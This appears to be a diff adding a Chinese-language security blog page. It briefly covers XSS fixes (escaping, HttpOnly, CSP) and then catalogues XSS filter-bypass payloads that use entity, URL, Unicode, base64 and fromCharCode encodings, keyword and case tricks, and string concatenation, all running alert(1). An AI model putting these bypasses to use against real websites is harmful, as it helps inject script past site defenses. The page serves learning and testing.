+<h2 id="6-XSS修复"><a href="#6-XSS修复" class="headerlink" title="6.XSS修复"></a>6.XSS修复</h2><h3 id="6-1、过滤危险字符"><a href="#6-1、过滤危险字符" class="headerlink" title="6.1、过滤危险字符"></a>6.1、过滤危险字符</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">转义&amp; &lt;&gt; &quot; &#x27; \ 等危险字符</span><br><span class="line">自定义过滤函数引用</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="6-2、HTTP-only"><a href="#6-2、HTTP-only" class="headerlink" title="6.2、HTTP-only"></a>6.2、HTTP-only</h3><p><a target="_blank" rel="noopener" href="https://www.php.cn/php-ask-457831.html">https://www.php.cn/php-ask-457831.html</a></p>
+<p>php.ini设置或代码引用</p>
+<p>session.cookie_httponly &#x3D;1</p>
+<p>ini_set(“session.cookie_httponly”, 1);</p>
+<h3 id="6-3、设置CSP-Content-Security-Policy"><a href="#6-3、设置CSP-Content-Security-Policy" class="headerlink" title="6.3、设置CSP(Content Security Policy)"></a>6.3、设置CSP(Content Security Policy)</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/a1766855068/article/details/89370320">https://blog.csdn.net/a1766855068/article/details/89370320</a></p>
+<p>header(“Content-Security-Policy:img-src ‘self’ “);</p>
+<h3 id="6-4、输入内容长度限制，实体转义等"><a href="#6-4、输入内容长度限制，实体转义等" class="headerlink" title="6.4、输入内容长度限制，实体转义等"></a>6.4、输入内容长度限制，实体转义等</h3><p><strong>由于浏览器对 xss 代码的解析过程是：html解析 —— url解析 —— js解析，</strong></p>
+<p><strong>所以可以编码方式进行组合绕过。</strong></p>
+<p><strong>注：href、src等加载url的属性可以使用三种混合编码，on事件可以使用html实体编码和js编码混合，但url编码在on事件中不会解析。</strong></p>
+<h2 id="7-XSS-过滤绕过"><a href="#7-XSS-过滤绕过" class="headerlink" title="7.XSS 过滤绕过"></a>7.XSS 过滤绕过</h2><p>编码&#x2F;&#x2F;标点符号&#x2F;&#x2F;关键字(大小写&#x2F;双写…..)</p>
+<h3 id="7-1、编码绕过"><a href="#7-1、编码绕过" class="headerlink" title="7.1、编码绕过"></a>7.1、编码绕过</h3><p>浏览器对 XSS 代码的解析顺序为：<strong>HTML解码 —— URL解码 —— JS解码(只支持UNICODE)</strong>—&gt;”<a>XXXX</a>“</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">浏览器</span><br><span class="line">&lt;a href=&quot;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt;test&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">--》&lt;a href=&quot;javascript:alert(1)&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p>编码：javascript:alert(1)–》js编码–》url(javascript:%61%6c%65%72%74%28%31%29)–&gt;html()–&gt;paload					</p>
+<p>解码–》html–&gt;url–&gt;js–&gt;得到结果进行网页显示</p>
+<h4 id="0x01-html-实体编码"><a href="#0x01-html-实体编码" class="headerlink" title="0x01. html 实体编码"></a>0x01. html 实体编码</h4><p><strong>当可控点为单个标签属性时，可以使用 html 实体编码。</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;可控点&quot;&gt;test&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe src=&quot;可控点&quot;&gt;test&lt;iframe&gt;</span><br><span class="line">&lt;img src=x onerror=&quot;可控点&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>Payload</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:alert(1)&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>十进制</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>十六进制</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>可以不带分号</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;&amp;#x6a&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3a&amp;#x61&amp;#x6c&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x31&amp;#x29&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>可以填充0</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;&amp;#x006a&amp;#x0061&amp;#x0076&amp;#x0061&amp;#x0073&amp;#x0063&amp;#x0072&amp;#x0069&amp;#x0070&amp;#x0074&amp;#x003a&amp;#x0061&amp;#x006c&amp;#x0065&amp;#x0072&amp;#x0074&amp;#x0028&amp;#x0031&amp;#x0029&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="0x02-url-编码"><a href="#0x02-url-编码" class="headerlink" title="0x02. url 编码"></a>0x02. url 编码</h4><p><strong>当注入点存在 href 或者 src 属性时，可以使用 url 编码。</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;可控点&quot;&gt;test&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe src=&quot;可控点&quot;&gt;test&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>Payload</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:alert(1)&quot;&gt;test&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;test&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>注：url 解析过程中，不能对协议类型进行任何的编码操作，所以 javascript: 协议头需要保留。</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:%61%6c%65%72%74%28%31%29&quot;&gt;test&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe src=&quot;javascript:%61%6c%65%72%74%28%31%29&quot;&gt;test&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>可以二次编码</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:%2561%256c%2565%2572%2574%2528%2531%2529&quot;&gt;test&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe src=&quot;javascript:%2561%256c%2565%2572%2574%2528%2531%2529&quot;&gt;test&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="0x03-js-编码"><a href="#0x03-js-编码" class="headerlink" title="0x03. js 编码"></a>0x03. js 编码</h4><p><strong>解析的时候字符或者字符串仅会被解码为字符串文本或者标识符名称，</strong></p>
+<p><strong>例如 js 解析器工作的时候将<code>\u0061\u006c\u0065\u0072\u0074</code>进行解码后为<code>alert</code>，而<code>alert</code>是一个有效的标识符名称，它是能被正常解析的。</strong></p>
+<p><strong>但是像圆括号、双引号、单引号等等这些字符就只能被当作普通的文本，从而导致无法执行。</strong></p>
+<p><strong>由于 js 是最后进行解析的，所以如果混合编码，需要先使用 js 编码再进行 url 编码或者 html 实体编码。</strong></p>
+<p><strong>js 编码策略：</strong></p>
+<ol>
+<li>“&quot; 加上三个八进制数字，如果个数不够，前面补0，例如 “&lt;” 编码为 “\074”</li>
+<li>“\x” 加上两个十六进制数字，如果个数不够，前面补0，例如 “&lt;” 编码为 “\x3c”</li>
+<li>“\u” 加上四个十六进制数字，如果个数不够，前面补0，例如 “&lt;” 编码为 “\u003c”</li>
+<li>对于一些控制字符，使用特殊的 C 类型的转义风格（例如 \n 和 \r）</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=&quot;可控点&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;input onfocus=location=&quot;可控点&quot; autofocus&gt; </span><br></pre></td></tr></table></figure>
+
+<p><strong>Payload</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=&quot;alert(1)&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;input onfocus=location=&quot;alert(1)&quot; autofocus&gt; </span><br></pre></td></tr></table></figure>
+
+<p><strong>Unicode 编码</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;input onfocus=location=&quot;javascript:\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029&quot; autofocus&gt; </span><br></pre></td></tr></table></figure>
+
+<p><strong>注：</strong></p>
+<p><strong>Unicode 编码时，只能对有效的标识符进行编码，否则非标识符解码后不能解析执行。</strong></p>
+<p><strong>例如 javascript:alert(1) ，进行 Unicode 编码时，只能对 alert 和 “1” 进行编码，框号编码后会被当成文本字符，不能执行。</strong></p>
+<p>ascii 八进制和十六进制编码使用时需要 eval、setTimeout等函数传递变量，并且可以对整个传递参数进行编码。</p>
+<p>例如 </p>
+<p>eval(“alert(1)”)，可以对 “alert(1)” 整个进行八进制、十六进制或者 Unicode 编码(双引号不参与)。**</p>
+<p><strong>八进制和十六进制</strong></p>
+<p>setTimeout() 是属于 window 的方法，该方法用于在指定的毫秒数后调用函数或计算表达式。</p>
+<p>语法：<code>setTimeout(要执行的代码, 等待的毫秒数)</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(JavaScript 函数, 等待的毫秒数)</span><br><span class="line">1.&lt;svg/onload=setTimeout(&#x27;\x61\x6C\x65\x72\x74\x28\x31\x29&#x27;)&gt;</span><br><span class="line">2.&lt;svg/onload=setTimeout(&#x27;\141\154\145\162\164\050\061\051&#x27;)&gt;</span><br><span class="line">3.&lt;svg/onload=setTimeout(&#x27;\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029&#x27;)&gt;</span><br><span class="line">4.&lt;script&gt;eval(&quot;\x61\x6C\x65\x72\x74\x28\x31\x29&quot;)&lt;/script&gt;</span><br><span class="line">5.&lt;script&gt;eval(&quot;\141\154\145\162\164\050\061\051&quot;)&lt;/script&gt;</span><br><span class="line">6.&lt;script&gt;eval(&quot;\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h4 id="0x04-混合编码"><a href="#0x04-混合编码" class="headerlink" title="0x04. 混合编码"></a>0x04. 混合编码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;可控点&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>Payload</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:alert(1)&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>html 编码</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>Unicode 编码</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:\u0061\u006c\u0065\u0072\u0074(1)&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>注：Unicode 编码不能对括号使用</strong></p>
+<p><strong>url 编码</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:%61%6c%65%72%74%28%31%29&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>由于浏览器对 xss 代码的解析过程是：html解析 —— url解析 —— js解析，所以可以编码方式进行组合绕过。</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1. 原代码</span><br><span class="line">&lt;a href=&quot;javascript:alert(1)&quot;&gt;test&lt;/a&gt;</span><br><span class="line">2. 对alert进行JS编码（unicode编码）</span><br><span class="line">&lt;a href=&quot;javascript:\u0061\u006c\u0065\u0072\u0074(1)&quot;&gt;test&lt;/a&gt;</span><br><span class="line">3. 对href标签中的\u0061\u006c\u0065\u0072\u0074进行URL编码</span><br><span class="line">&lt;a href=&quot;javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(1)&quot;&gt;test&lt;/a&gt;</span><br><span class="line">4. 对href标签中的javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(1)进行HTML编码：</span><br><span class="line">&lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;&amp;#x29;&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>注：href、src等加载url的属性可以使用三种混合编码，on事件可以使用html实体编码和js编码混合，但url编码在on事件中不会解析。</strong></p>
+<h4 id="0x05-base64-编码"><a href="#0x05-base64-编码" class="headerlink" title="0x05. base64 编码"></a>0x05. base64 编码</h4><p><strong>base64 编码通常需要使用到 data 伪协议。</strong></p>
+<p><strong>data 协议使用方法：<code>data:资源类型;编码,内容</code></strong></p>
+<p>base64编码内容为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br><span class="line">PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=</span><br></pre></td></tr></table></figure>
+
+<p>通常与 base64 编码配合 data 协议的标签有 <strong><object>、<a>、<iframe></strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1.&lt;object&gt; 标签</span><br><span class="line">&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;&gt;&lt;/object&gt;</span><br><span class="line"></span><br><span class="line">2.&lt;a&gt; 标签</span><br><span class="line">&lt;a href=&quot;data:text/html;base64, PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;&gt;test&lt;/a&gt;   （新版浏览器不支持）</span><br><span class="line"></span><br><span class="line">3.&lt;iframe&gt; 标签</span><br><span class="line">&lt;iframe src=&quot;data:text/html;base64, PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">4.&lt;embed&gt; 标签</span><br><span class="line">&lt;embed src=&quot;data:text/html;base64, PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;&gt;&lt;/embed&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>atob 函数</strong></p>
+<p>atob() 方法用于解码使用 base-64 编码的字符串。</p>
+<p>语法：<code>window.atob(encodedStr)</code>(encodedStr: 必需，是一个通过 btoa() 方法编码的字符串)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.&lt;a href=javascript:eval(atob(&#x27;YWxlcnQoMSk=&#x27;))&gt;test&lt;/a&gt;</span><br><span class="line">2.&lt;a href=javascript:eval(window.atob(&#x27;YWxlcnQoMSk=&#x27;))&gt;test&lt;/a&gt;</span><br><span class="line">3.&lt;a href=javascript:eval(window[&#x27;atob&#x27;](&#x27;YWxlcnQoMSk=&#x27;))&gt;test&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">4.&lt;img src=x onmouseover=&quot;eval(window.atob(&#x27;YWxlcnQoMSk=&#x27;))&quot;&gt;</span><br><span class="line">5.&lt;img src=x onerror=&quot;eval(atob(&#x27;YWxlcnQoMSk=&#x27;))&quot;&gt;</span><br><span class="line">6.&lt;iframe src=&quot;javascript:eval(window[&#x27;atob&#x27;](&#x27;YWxlcnQoMSk=&#x27;))&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="0x06-ascii-编码"><a href="#0x06-ascii-编码" class="headerlink" title="0x06. ascii 编码"></a>0x06. ascii 编码</h4><p>ascii 编码一般配合<code>String.fromCharCode</code>使用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">alert(1)xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">十进制：97, 108, 101, 114, 116, 40, 49, 41</span><br><span class="line">十六进制：0x61, 0x6C, 0x65, 0x72, 0x74, 0x28, 0x31, 0x29</span><br></pre></td></tr></table></figure>
+
+<p><strong>十进制</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&#x27;javascript:eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41))&#x27;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>十六进制</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&#x27;javascript:eval(String.fromCharCode(0x61, 0x6C, 0x65, 0x72, 0x74, 0x28, 0x31, 0x29))&#x27;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h3 id="7-2、空格过滤绕过"><a href="#7-2、空格过滤绕过" class="headerlink" title="7.2、空格过滤绕过"></a>7.2、空格过滤绕过</h3><html><img**AA**src**AA**onerror**BB**=**BB**alert**CC**(1)**DD**></html>
+
+<p>A位置可填充 &#x2F;，&#x2F;123&#x2F;，%09，%0A，%0C，%0D，%20 </p>
+<p>B位置可填充 %09，%0A，%0C，%0D，%20 </p>
+<p>C位置可填充 %0B，&#x2F;**&#x2F;，</p>
+<p>如果加了双引号，则可以填充 %09，%0A，%0C，%0D，%20</p>
+<p> D位置可填充 %09，%0A，%0C，%0D，%20，&#x2F;&#x2F;，&gt;</p>
+<h3 id="7-3、圆括号过滤绕过"><a href="#7-3、圆括号过滤绕过" class="headerlink" title="7.3、圆括号过滤绕过"></a>7.3、圆括号过滤绕过</h3><h4 id="0x01-反引号替换"><a href="#0x01-反引号替换" class="headerlink" title="0x01. 反引号替换"></a>0x01. 反引号替换</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert`1`&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="0x02-throw-绕过"><a href="#0x02-throw-绕过" class="headerlink" title="0x02. throw 绕过"></a>0x02. throw 绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;video src onerror=&quot;javascript:window.onerror=alert;throw 1&quot;&gt;</span><br><span class="line">&lt;svg/onload=&quot;window.onerror=eval;throw&#x27;=alert\x281\x29&#x27;;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="7-4、单引号过滤绕过"><a href="#7-4、单引号过滤绕过" class="headerlink" title="7.4、单引号过滤绕过"></a>7.4、单引号过滤绕过</h3><h4 id="0x01-斜杠替换"><a href="#0x01-斜杠替换" class="headerlink" title="0x01. 斜杠替换"></a>0x01. 斜杠替换</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="0x02-反引号替换"><a href="#0x02-反引号替换" class="headerlink" title="0x02. 反引号替换"></a>0x02. 反引号替换</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(`xss`)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="7-5、alert-过滤绕过"><a href="#7-5、alert-过滤绕过" class="headerlink" title="7.5、alert 过滤绕过"></a>7.5、alert 过滤绕过</h3><h4 id="0x01-prompt-替换"><a href="#0x01-prompt-替换" class="headerlink" title="0x01. prompt 替换"></a>0x01. prompt 替换</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;prompt(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="0x02-confirm-替换"><a href="#0x02-confirm-替换" class="headerlink" title="0x02. confirm 替换"></a>0x02. confirm 替换</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;confirm(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="0x03-console-log-替换"><a href="#0x03-console-log-替换" class="headerlink" title="0x03. console.log 替换"></a>0x03. console.log 替换</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;console.log(3)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="0x04-document-write-替换"><a href="#0x04-document-write-替换" class="headerlink" title="0x04. document.write 替换"></a>0x04. document.write 替换</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;document.write(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="0x05-base64-绕过"><a href="#0x05-base64-绕过" class="headerlink" title="0x05. base64 绕过"></a>0x05. base64 绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=&quot;Function`a$&#123;atob`YWxlcnQoMSk=`&#125;```&quot;&gt;</span><br><span class="line">&lt;img src=x onerror=&quot;``.constructor.constructor`a$&#123;atob`YWxlcnQoMSk=`&#125;```&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="7-6、关键词置空绕过"><a href="#7-6、关键词置空绕过" class="headerlink" title="7.6、关键词置空绕过"></a>7.6、关键词置空绕过</h3><h4 id="0x01-大小写绕过"><a href="#0x01-大小写绕过" class="headerlink" title="0x01. 大小写绕过"></a>0x01. 大小写绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以转换为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ScRiPt&gt;AlErT(/xss/)&lt;/sCrIpT&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="0x02-双写绕过"><a href="#0x02-双写绕过" class="headerlink" title="0x02. 双写绕过"></a>0x02. 双写绕过</h4><p>嵌套<script>和</script>突破</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以转换为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sc&lt;script&gt;ript&gt;alert(/xss/)&lt;/sc&lt;/script&gt;ript&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="7-7、函数拼接"><a href="#7-7、函数拼接" class="headerlink" title="7.7、函数拼接"></a>7.7、函数拼接</h3><h4 id="0x01-eval"><a href="#0x01-eval" class="headerlink" title="0x01. eval"></a>0x01. eval</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(&#x27;al&#x27;+&#x27;ert(1)&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
